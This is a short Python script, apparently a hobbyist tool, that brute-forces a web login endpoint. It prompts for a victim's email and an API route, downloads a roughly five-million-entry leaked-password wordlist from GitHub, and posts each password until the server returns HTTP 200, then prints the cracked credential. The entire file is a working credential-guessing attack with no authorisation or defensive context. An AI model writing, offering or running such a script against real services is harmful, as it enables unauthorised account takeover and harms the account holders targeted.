import requests

email = input("Type the email of the account that you want to find ")
apiAddress = input("Type the address of the API (with route ex: /login) ")

# Xato net password, 5mi passwords
wordList = requests.get("https://raw.githubusercontent.com/kkrypt0nn/wordlists/main/passwords/xato_net_passwords.txt").text.split("\n")

for password in wordList:
    payload = {
        "email": email,
        "password": password
    }
    print(f"Payload tested: {payload}")
    triedRequest = requests.post(apiAddress, json=payload)
    if triedRequest.status_code == 200:
        print(f"Password find! Email: {email}, password: {password}")
        break